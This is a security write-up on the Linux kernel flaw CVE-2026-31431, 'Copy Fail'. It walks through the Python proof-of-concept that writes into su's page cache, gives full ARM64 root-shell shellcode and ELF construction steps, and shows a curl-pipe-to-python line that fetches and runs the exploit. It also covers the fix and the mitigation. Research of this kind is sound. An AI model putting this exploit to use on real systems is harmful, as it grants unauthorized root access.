# Copy Fail on ARM64: Understanding and Porting CVE-2026-31431

**Disclaimer:** This post is for educational and self-learning purposes only. The techniques described here should only be used on systems owned by or explicitly authorized to the reader. The author is not responsible for any misuse of this information. Affected systems should be updated or have the mitigation described at the end of this post applied.

---

## Introduction

On April 29, 2026, security research firm Xint disclosed [CVE-2026-31431](https://copy.fail/), a Linux kernel privilege escalation vulnerability they named "Copy Fail." The bug is remarkable for several reasons: the entire exploit is a 732-byte Python script, it works without any race conditions or version-specific offsets, and the same script roots every major Linux distribution shipped since 2017.

Xint published a detailed [write-up](https://xint.io/blog/copy-fail-linux-distributions) and a working x86-64 proof of concept. I wanted to understand how the exploit actually works, and since my daily machine is an Apple Silicon Mac, the Linux VM I had on hand happened to be ARM64 -- so naturally I wondered if I could get it working there too.

This post documents what I learned, including a failed first attempt that broke my `su` binary, an unexpected discovery about automatic security mitigations, and the process of constructing an ARM64-compatible payload.

---

## Background Concepts

> **TL;DR:** This section explains page cache, splice, AF_ALG, AEAD/authencesn, scatterlist, setuid, and ELF basics. If these are already familiar, or if the "Root Cause" and "Trigger" sections of the [Xint write-up](https://xint.io/blog/copy-fail-linux-distributions) made sense on first read, skip to [How the Exploit Works](#how-the-exploit-works).

Before diving into the exploit, I want to cover the kernel concepts involved. Some of these may be familiar from a systems or security course. If not, don't worry -- I'll keep it simple.

### Page Cache

When a process reads a file on Linux, the kernel doesn't read from disk every time. Instead, it keeps a copy of the file's data in RAM, in a region called the **page cache**. A "page" is a 4 KB chunk of physical memory.

```
First read of /usr/bin/su:
  Disk -> [kernel reads into RAM] -> Page Cache (physical memory page)

Every subsequent read/mmap/execve of /usr/bin/su:
  Page Cache -> [directly from RAM, no disk access]
```

The critical thing to understand is that **all processes share the same page cache**. When the kernel executes a binary via `execve()`, it loads the code from the page cache, not from disk. If someone could modify the page cache without going through normal file write paths (which check permissions), they could change what every process -- including setuid binaries -- sees when it reads that file.

### splice() and Zero-Copy

`splice()` is a Linux system call that moves data between two file descriptors **without copying it through userspace**. A normal `read()` + `write()` copies data twice: once from kernel to the user buffer, once from the user buffer back to kernel. `splice()` avoids this by passing **references to the original physical pages**.

```
Normal read + write:
  File --> [copy] --> User Buffer --> [copy] --> Destination
  (Two copies, data is duplicated)

splice():
  File --> [pass page reference] --> Destination
  (Zero copies, same physical page)
```

This is important because when `splice()` moves file data into a pipe, the pipe doesn't get a copy of the data. It gets a pointer to the **same physical page** in the page cache. Whatever happens to that page afterward happens to the file's cached content.

One constraint: `splice()` requires at least one end to be a pipe. So moving data from a file to a socket requires two splices: file-to-pipe, then pipe-to-socket.

### AF_ALG: Crypto Sockets

`AF_ALG` is a socket type (like `AF_INET` for networking) that lets userspace programs use the kernel's built-in cryptographic algorithms. No privileges required -- any user can open one.

```python
sock = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)         # Create crypto socket
sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))")) # Bind to an algorithm
req, _ = sock.accept()                                    # Get a request socket
req.sendmsg(data)                                         # Send data to encrypt/decrypt
result = req.recv(size)                                    # Get the result
```

The interface works like a regular socket: send data in, receive processed data out. The crucial point for this exploit is that AF_ALG supports `splice()` -- meaning page cache pages can be fed directly into the crypto subsystem.

### AEAD and authencesn

AEAD stands for **Authenticated Encryption with Associated Data**. It combines encryption (keeping data secret) with authentication (detecting tampering). The "associated data" (AAD) is extra metadata that gets authenticated but not encrypted.

`authencesn` is a specific AEAD template in the Linux kernel, designed for IPsec with **Extended Sequence Numbers** (ESN). IPsec uses 64-bit sequence numbers to prevent replay attacks, split into two halves:

- `seqno_hi`: upper 32 bits (maintained locally, not sent on the wire)
- `seqno_lo`: lower 32 bits (included in each packet)

For HMAC calculation, `authencesn` needs to rearrange these bytes in memory. It does this **in-place**, using the destination buffer as scratch space. This rearrangement is where the bug lives.

### Scatterlist

A scatterlist is a kernel data structure -- essentially an array of pointers, where each entry points to a physical memory page (plus an offset and length). It lets the kernel treat multiple scattered memory pages as one contiguous buffer.

```
Scatterlist:
  entry[0] --> Physical Page A (offset=0, len=4096)
  entry[1] --> Physical Page B (offset=0, len=4096)
  entry[2] --> Physical Page C (offset=0, len=2048)

Logically: one continuous 14336-byte buffer
Physically: three separate pages in RAM
```

Multiple scatterlists can be chained together with `sg_chain()`, which makes one seamlessly follow another during traversal. The traversal function (`scatterwalk_map_and_copy`) just walks forward by byte offset -- it doesn't know or care what kind of memory each page is.

### setuid Binaries

A setuid binary runs with the permissions of its **owner**, not the user who executes it. `/usr/bin/su` is owned by root and has the setuid bit set:

```
-rwsr-xr-x 1 root root ... /usr/bin/su
   ^
   setuid bit
```

When any user runs `su`, the process runs as root. The program itself checks the caller's password before giving a root shell. But the kernel doesn't enforce the password check -- that's entirely implemented in `su`'s code. If someone could replace `su`'s code with something that skips the password check, they'd get root directly.

### ELF Format (Minimal Version)

ELF (Executable and Linkable Format) is the binary format used by Linux executables. A full ELF binary has many sections (symbol tables, debug info, dynamic linking info), but the kernel only needs two things to load and run an ELF:

1. **ELF Header** (64 bytes for 64-bit): magic number, architecture, entry point address
2. **Program Header** (56 bytes each): tells the kernel which parts of the file to load into memory and where

A complete, runnable ELF binary can be as small as 120 bytes of headers plus the actual machine code.

---

## How the Exploit Works

> **TL;DR:** A step-by-step walkthrough of the PoC Python code -- socket setup, AAD construction, splice, recv trigger, and the write loop. Covers similar ground to "The Trigger," "The Exploit," and "How This Happened" in the [Xint write-up](https://xint.io/blog/copy-fail-linux-distributions), but from the perspective of reading the Python code rather than the kernel C code. Skip to [The Failed First Attempt](#the-failed-first-attempt-x86-64-exploit-on-arm64) if the exploit mechanism is already clear.

Now let's walk through the exploit step by step. I'll reference a [deobfuscated version](https://github.com/theori-io/copy-fail-CVE-2026-31431) of the original 732-byte PoC.

### The Core Primitive: Writing 4 Bytes to the Page Cache

The heart of the exploit is a function that writes exactly 4 bytes to an arbitrary offset in a target file's page cache. Here's how it works:

**Step 1: Open a crypto socket and bind to the vulnerable algorithm.**

```python
alg_sock = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
```

`authencesn` is the only AEAD algorithm in the kernel that writes past its output boundary. Every other algorithm (GCM, CCM, regular authenc) confines writes to the legitimate output area.

**Step 2: Construct the payload in AAD.**

```python
aad = b"A" * 4 + four_bytes     # bytes[0:4] = seqno_hi (don't care)
                                # bytes[4:8] = seqno_lo (the 4 bytes to write)
```

The AAD's bytes 4-7 become `seqno_lo` in `authencesn`'s ESN logic. During decryption, `authencesn` writes `seqno_lo` to `dst[assoclen + cryptlen]` -- a position past the legitimate output area. The attacker controls this value.

**Step 3: Use splice() to get page cache references into the crypto scatterlist.**

```python
pipe_r, pipe_w = os.pipe()
os.splice(target_fd, pipe_w, splice_len, offset_src=0)    # File --> Pipe
os.splice(pipe_r, req_sock.fileno(), splice_len)           # Pipe --> AF_ALG
```

The first splice reads `/usr/bin/su` -- but it doesn't copy the data. It passes the page cache page's reference into the pipe. The second splice passes that same reference into the AF_ALG socket's TX scatterlist. Now the crypto subsystem holds a direct pointer to `su`'s page cache page.

**Step 4: Trigger the write.**

```python
try:
    req_sock.recv(ASSOCLEN + offset)
except OSError:
    pass
```

`recv()` triggers the AEAD decryption. Inside the kernel:

1. The in-place optimization chains the page cache page (from splice) into the writable destination scatterlist via `sg_chain()`
2. `authencesn` writes `seqno_lo` (attacker's 4 bytes) to `dst[assoclen + cryptlen]`
3. `scatterwalk_map_and_copy` walks past the RX buffer into the chained page cache page
4. `kmap_local_page()` + `memcpy()` writes directly to the physical page
5. HMAC verification fails (the ciphertext is fabricated), `recv()` returns an error
6. But the page cache write is already done and **cannot be rolled back**

**Step 5: Repeat for the entire payload, then execute.**

```python
for i in range(0, len(shellcode), 4):
    page_cache_write(target_fd, i, shellcode[i:i+4])

os.system("su")
```

The exploit loops through the shellcode 4 bytes at a time, overwriting the beginning of `/usr/bin/su` in the page cache. Then it executes `su`. The kernel loads the binary from the page cache -- which now contains the attacker's code -- and because `su` is setuid-root, the injected code runs as root.

### What's in the Payload?

The payload is not just shellcode -- it's a **complete minimal ELF binary** (160 bytes for x86-64). Using `lief` and `capstone` to analyze it:

```
=== ELF Header ===
Class:       ELF64
Machine:     x86_64
Type:        ET_EXEC (static executable)
Entry point: 0x400078

=== Segments ===
Segment 0: type=PT_LOAD vaddr=0x400000 filesz=0x9e flags=R|X

=== Disassembly (from entry 0x400078) ===
0x400078: xor eax, eax        # setuid(0)
0x40007a: xor edi, edi
0x40007c: mov al, 0x69        # syscall 105 = setuid
0x40007e: syscall

0x400080: lea rdi, [rip+0xf]  # pointer to "/bin/sh"
0x400087: xor esi, esi        # argv = NULL
0x400089: push 0x3b           # syscall 59 = execve
0x40008b: pop rax
0x40008c: cdq                 # envp = NULL
0x40008d: syscall              # execve("/bin/sh", NULL, NULL)

0x40008f: xor edi, edi        # exit(0)
0x400091: push 0x3c
0x400093: pop rax
0x400094: syscall
```

The payload replaces the beginning of `su` with a tiny static ELF that does three things: `setuid(0)` to become root (which succeeds because `su` is setuid-root), `execve("/bin/sh")` to spawn a root shell, and `exit(0)` as a fallback. No password check, no PAM, no nothing. Just straight to root.

The 160 bytes break down as:

| Component | Size | Purpose |
|-----------|------|---------|
| ELF header | 64 bytes | Minimum for kernel to recognize and load the binary |
| Program header | 56 bytes | One PT_LOAD segment mapping the entire file |
| Machine code | 30 bytes | Three syscalls: setuid, execve, exit |
| "/bin/sh\0" | 8 bytes | String data for execve |
| Alignment | 2 bytes | Padding |

---

## The Failed First Attempt: x86-64 Exploit on ARM64

My first Linux VM happened to be ARM64 (aarch64). I naively ran the x86-64 exploit on it:

```
$ curl https://copy.fail/exp | python3 && su
sh: 1: su: Exec format error
zsh: exec format error: su
```

`su` was broken. Let's see what happened:

```
$ file $(which su)
/usr/bin/su: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
statically linked, no section header
```

The file was now identified as an x86-64 binary -- on an ARM64 system. The exploit's page cache write primitive had worked perfectly (it's architecture-independent), but the payload was x86-64 machine code and ELF headers. It overwrote the ARM64 `su` binary's page cache with x86-64 content, making it unexecutable on ARM64.

After reinstalling the package:

```
$ sudo apt-get install --reinstall util-linux
$ file $(which su)
/usr/bin/su: setuid ELF 64-bit LSB pie executable, ARM aarch64, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, ...
```

Back to normal. The key insight: **the vulnerability primitive is architecture-independent; only the payload is architecture-specific.** The page cache was successfully corrupted on ARM64 -- it just contained the wrong architecture's code.

I could also have recovered without reinstalling, by simply dropping the page cache:

```
$ echo 1 | sudo tee /proc/sys/vm/drop_caches
```

This forces the kernel to discard all cached pages. The next time `su` is accessed, it gets reloaded from disk -- where the original, uncorrupted file still lives. The exploit only modifies the in-memory page cache, never the on-disk file.

---

## Discovering Auto-Mitigation

I then tried on an x86-64 VM, expecting the exploit to work. Instead:

```
FileNotFoundError: [Errno 2] No such file or directory
```

The error came from `socket.bind(("aead", "authencesn(...)"))`. When the kernel can't load the requested crypto algorithm module, it returns `ENOENT`, which Python surfaces as `FileNotFoundError`. Checking why:

```
$ grep -r algif /etc/modprobe.d/
/etc/modprobe.d/disable-algif_aead.conf:# Disable algif_aead module due to CVE-2026-31431
/etc/modprobe.d/disable-algif_aead.conf:install algif_aead /bin/false
```

The distribution had automatically blacklisted the vulnerable module. Looking at the timeline:

```
$ stat /etc/modprobe.d/disable-algif_aead.conf
Modify: 2026-04-30    <-- One day after CVE public disclosure (Apr 29)
Birth:  2026-05-02    <-- When unattended-upgrades installed it on my VM
```

The `unattended-upgrades` service (enabled by default on Ubuntu) had automatically pulled in the mitigation. The distribution maintainers packaged the workaround one day after disclosure, and my VM applied it three days later without any manual intervention.

To test the exploit, I had to manually remove the blacklist and load the module:

```
$ sudo rm /etc/modprobe.d/disable-algif_aead.conf
$ sudo modprobe algif_aead
```

After that, the x86-64 exploit worked as described -- confirming that the kernel itself was not yet patched (only the module was blacklisted as a temporary mitigation).

---

## Constructing the ARM64 Payload

With a solid understanding of the exploit, I set out to build an ARM64-compatible payload. The Python exploit code doesn't need any changes -- only the compressed payload (the minimal ELF binary) needs to be replaced with an ARM64 version.

### ARM64 Shellcode

Here's the assembly I wrote (`call.s`):

```asm
.text
.global main

main:
    // setuid(0)
    mov x0, #0
    mov x8, #146
    svc #0

    // execve("/bin/sh", NULL, NULL);
    adr x0, binsh
    mov x1, #0
    mov x2, #0
    mov x8, #221
    svc #0

    // exit(1)
    mov x0, #1
    mov x8, #93
    svc #0

binsh:
    .asciz "/bin/sh"
```

Let me compare this with the x86-64 version side by side:

**setuid(0):**

| | x86-64 | ARM64 |
|---|---|---|
| Syscall number | 105 (`mov al, 0x69`) | 146 (`mov x8, #146`) |
| Argument (uid=0) | `xor edi, edi` | `mov x0, #0` |
| Trigger | `syscall` | `svc #0` |

**execve("/bin/sh", NULL, NULL):**

| | x86-64 | ARM64 |
|---|---|---|
| Syscall number | 59 (`push 0x3b; pop rax`) | 221 (`mov x8, #221`) |
| Path pointer | `lea rdi, [rip+0xf]` | `adr x0, binsh` |
| argv = NULL | `xor esi, esi` | `mov x1, #0` |
| envp = NULL | `cdq` (sign-extends eax to edx) | `mov x2, #0` |
| Trigger | `syscall` | `svc #0` |

**Key architectural differences:**

- **Syscall numbers are different.** Linux assigns different numbers per architecture. x86-64 and ARM64 share almost no syscall numbers.
- **Instruction encoding.** x86-64 has variable-length instructions (1-15 bytes), so shellcode authors use tricks like `push imm8; pop rax` (3 bytes) instead of `mov eax, imm32` (5 bytes) to save space. ARM64 has fixed 4-byte instructions, so no such tricks are needed -- every instruction is exactly 4 bytes.
- **Syscall trigger.** x86-64 uses `syscall`, ARM64 uses `svc #0`. Both trap into the kernel.
- **String reference.** x86-64 uses `lea rdi, [rip + offset]` (RIP-relative addressing). ARM64 uses `adr x0, label` (PC-relative addressing). Both are position-independent -- the code works regardless of where it's loaded in memory.

### Constructing the Minimal ELF

The assembly alone isn't enough. The kernel needs a valid ELF binary to load and execute. I had to construct a minimal ELF with just two structures:

**ELF Header (64 bytes)** -- the fields that matter for ARM64:

| Field | Value | Notes |
|-------|-------|-------|
| `e_ident` (magic) | `\x7fELF` | Same for all ELF files |
| `EI_CLASS` | 2 | 64-bit |
| `EI_DATA` | 1 | Little-endian |
| `e_type` | `ET_EXEC` (2) | Static executable, no dynamic linker needed |
| `e_machine` | `EM_AARCH64` (0xB7) | This is the key change from x86-64 (0x3E) |
| `e_entry` | `0x400078` | Virtual address of the first instruction (header_size + phdr_size = 120 = 0x78) |
| `e_phoff` | 64 | Program header starts right after ELF header |
| `e_phnum` | 1 | Just one LOAD segment |

**Program Header (56 bytes)** -- one PT_LOAD segment:

| Field | Value | Notes |
|-------|-------|-------|
| `p_type` | `PT_LOAD` (1) | Load this segment into memory |
| `p_flags` | `PF_R \| PF_X` (5) | Readable and executable |
| `p_offset` | 0 | Load from the start of the file |
| `p_vaddr` | `0x400000` | Load at this virtual address |
| `p_filesz` | total file size | How many bytes to load from the file |
| `p_memsz` | total file size | How much memory to allocate |
| `p_align` | `0x1000` | Page-aligned |

The final layout:

```
Offset 0x00: ELF Header (64 bytes)
Offset 0x40: Program Header (56 bytes)
Offset 0x78: ARM64 machine code (shellcode)
Offset 0x??: "/bin/sh\0" string
```

The entry point `0x400078` = base address `0x400000` + code offset `0x78`. When the kernel loads this ELF, it maps the entire file at `0x400000` and jumps to `0x400078`, where the shellcode begins.

A few things I had to keep in mind:

- **No dynamic linker.** The real `/usr/bin/su` is dynamically linked (it needs `ld-linux-aarch64.so.1` to resolve library calls). My payload is `ET_EXEC` (static) -- the kernel jumps directly to the entry point without involving a dynamic linker. This keeps the payload tiny and self-contained.
- **No section headers.** Section headers are used by debuggers and linkers, but the kernel doesn't need them to load and execute a binary. Omitting them saves space.
- **ARM64 instructions are 4 bytes each.** This changes the total code size compared to x86-64 (which uses variable-length instructions), affecting the string offset, entry point, and total file size. All these values are interdependent and must be calculated together.

### Assembling Everything

The process was:

1. Write the assembly (`call.s`)
2. Assemble it with `gcc -c` to get an object file
3. Extract the raw machine code with `objcopy -O binary -j .text`
4. Construct the ELF header and program header with the correct ARM64 fields
5. Concatenate: ELF header + program header + machine code
6. Compress with zlib and embed in the Python exploit as a hex string

The Python exploit code itself is completely unchanged -- the only difference is the compressed payload constant.

---

## Successful ARM64 Exploitation

After constructing the ARM64 payload and embedding it in the exploit, I ran it on my ARM64 VM (with the `algif_aead` module loaded on an unpatched kernel). It worked: `setuid(0)` succeeded, `/bin/sh` launched, and I had a root shell.

The entire exercise confirmed what the Xint researchers designed: **the vulnerability primitive (page cache write via AF_ALG + splice + authencesn) is completely architecture-independent.** The same Python code, the same socket setup, the same splice calls, the same recv trigger. Only the 160-ish bytes of compressed payload needed to change.

---

## Takeaways

> **TL;DR:** Root cause summary, the kernel fix, and mitigation steps. Equivalent to "The Fix" and "Remediation" in the [Xint write-up](https://xint.io/blog/copy-fail-linux-distributions).

### How the Bug Happened

Three independent, reasonable design decisions intersected to create this vulnerability:

1. **splice() (2005+):** Passes page cache page references into pipes for zero-copy efficiency. Assumes downstream consumers will only read these pages.
2. **algif_aead in-place optimization (2017):** Chains page cache pages from the TX scatterlist into the writable destination scatterlist via `sg_chain()`. Assumes all AEAD algorithms confine writes to the legitimate output area.
3. **authencesn ESN scratch write (2011):** Writes `seqno_lo` past the output boundary for HMAC byte rearrangement. Assumes the destination buffer has safe scratch space beyond its bounds.

Each assumption was valid in its original context. None of the developers knew about the others' assumptions. The bug existed silently for nearly a decade.

### The Fix

The kernel fix (commit `a664bf3d603d`) reverts the 2017 in-place optimization. After the fix, `req->src` (input) and `req->dst` (output) point to separate scatterlists. Page cache pages only appear in src (read-only), never in dst (writable). Even if `authencesn` writes past its boundary in dst, it only corrupts the user's own recv buffer -- no security impact.

### Mitigation

For systems that can't be updated immediately:

```bash
# Blacklist the vulnerable module
echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/disable-algif-aead.conf
sudo rmmod algif_aead 2>/dev/null
```

This blocks `AF_ALG` AEAD socket creation entirely. It won't affect IPsec, dm-crypt, kTLS, or any other in-kernel crypto user -- they don't go through `AF_ALG`. The only thing it breaks is userspace programs that explicitly use `AF_ALG` AEAD sockets, which is extremely rare.

---

## References

- [Copy Fail -- CVE-2026-31431](https://copy.fail/) (official site)
- [Xint Blog: Copy Fail Write-up](https://xint.io/blog/copy-fail-linux-distributions) (detailed technical analysis)
- [Exploit PoC](https://github.com/theori-io/copy-fail-CVE-2026-31431) (x86-64, published by Xint/Theori)
- [Kernel fix: commit a664bf3d603d](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a664bf3d603d) (reverts in-place optimization)
- [RFC 4303](https://www.rfc-editor.org/rfc/rfc4303) (IPsec ESP / Extended Sequence Numbers)
- [ARM64 Linux Syscall Table](https://arm64.syscall.sh/) (syscall numbers reference)
